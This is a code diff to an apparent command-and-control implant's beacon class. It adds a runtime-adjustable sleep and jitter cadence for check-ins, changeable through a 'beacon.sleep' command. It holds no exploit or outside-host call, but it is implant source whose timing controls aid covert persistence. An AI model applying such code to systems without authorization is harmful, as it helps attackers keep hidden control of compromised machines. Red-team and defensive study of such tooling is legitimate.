@@ -57,6 +57,10 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     private readonly IReadOnlyList<string> _classVerbs;
     private readonly TextWriter _log;
 
+    // The live cadence (runtime-retunable through beacon.sleep); null keeps
+    // the baked sleep/jitter pair, the pre-cadence shape tests construct.
+    private readonly Cadence? _cadence;
+
     // The fronted-pivot ledger (architecture.md Sec 5.2), shared with the
     // gRPC beacon through the one EnrollBundle the program hands both: the
     // Pivot children this implant enrolled, whose tasking a check-in executes.
@@ -109,7 +113,8 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         IReadOnlyList<string> classVerbs,
         TextWriter log,
         TaskNonceTracker? nonces = null,
-        TransportProfile? transport = null)
+        TransportProfile? transport = null,
+        Cadence? cadence = null)
     {
         _egress = egress;
         _implantId = implantId;
@@ -121,7 +126,10 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         _sleep = sleep;
         _jitter = jitter;
         _killDate = killDate;
-        _handlers = HandlerRegistry.Default(enroll, ExtensionRegistrations.Handlers);
+        // The cadence rides into the registry so beacon.sleep retunes this
+        // run, whichever client carries it.
+        _handlers = HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers);
+        _cadence = cadence;
         _fronted = enroll?.Fronted;
         _classVerbs = classVerbs;
         _log = log;
@@ -213,7 +221,10 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             }
             try
             {
-                await CheckInCadence.SleepWithJitterAsync(_sleep, _jitter, consecutiveFailures, cancellationToken);
+                // The cadence is read fresh every cycle, so a beacon.sleep
+                // change lands on the very next sleep.
+                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
+                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
